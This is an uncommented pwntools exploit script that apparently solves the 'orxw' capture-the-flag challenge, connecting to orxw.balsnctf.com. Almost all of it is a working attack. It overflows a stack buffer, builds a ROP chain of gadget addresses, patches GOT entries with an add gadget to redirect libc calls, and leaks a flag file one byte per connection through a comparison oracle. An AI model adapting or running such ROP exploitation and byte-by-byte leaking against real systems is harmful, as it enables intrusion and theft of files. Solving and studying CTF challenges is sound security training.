from pwn import *


elf = ELF("./orxw")

pop_rdi = 0x00401573
pop_rsi_r15 = 0x00401571
modi_open = elf.plt['puts']
read = elf.plt['read']
ppppppr = 0x0040156a        # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
rdx_set = 0x00401550        # mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword [r15+rbx*8] ;  (1 found)
add_gadget = 0x0040125c     # add dword [rbp-0x3D], ebx ; nop  ; ret  ;  (1 found)
ret = 0x401574
modi_gadget = elf.plt['fork']   # mov rdi, qword [r15] ; call rbx ;
modi_cmp = elf.plt['setbuf']    # cmp byte [rbp+0x13], r14L ; ret  ;  (1 found)

ans = b""
for i in range(0x50):
    # p = process("./orxw")
    p = remote("orxw.balsnctf.com", 19091)
    payload = b"A"*0x18
    payload += p64(ppppppr) + p64(u32(b"flag")) + p64(0x4040a0+0x3d)+p64(0x0)*4 + p64(add_gadget)
    payload += p64(ppppppr) + p64(0x898b0) + p64(0x404030+0x3d) + p64(0x0)*4 + p64(add_gadget)
    payload += p64(ppppppr) + p64(0x37e90) + p64(0x404068+0x3d) + p64(0x0)*4 + p64(add_gadget)
    payload += p64(ppppppr) + p64(0x43599) + p64(0x404040+0x3d) + p64(0x0)*4 + p64(add_gadget)
    payload += p64(ppppppr) + p64(0x2b480) + p64(0x404060+0x3d) + p64(0x0)*4 + p64(add_gadget)
    payload += p64(ppppppr) + p64(0x0) + p64(0x40408d-0x13) + p64(0x0)*4 + p64(modi_cmp)
    payload += p64(ppppppr) + p64(0x0) + p64(0x1) + p64(0x1) + p64(0x40408d) + p64(0x1) + p64(elf.got['wait'])
    payload += p64(0x401564)
    # payload += p64()
    payload += p64(ppppppr) + p64(0x0) + p64(0x1) + p64(0x4040a0) + p64(0x0) + p64(0x0) + p64(0x404030) + p64(rdx_set)
    payload += p64(0x0)*7
    payload += p64(ppppppr) + p64(0x0) + p64(0x1) + p64(0x0) + p64(0x4040f0) + p64(0x100) + p64(elf.got['read']) + p64(rdx_set)
    payload += p64(ppppppr) + p64(elf.plt['_exit']) + p64(0x0)*4 + p64(0x4040f0+i) + p64(elf.plt['fork'])

    print(hex(len(payload)))

    p.sendlineafter("Can you defeat orxw?\n", payload)
    ans += p.recv(1)
    print(ans)
    p.close()

p.interactive()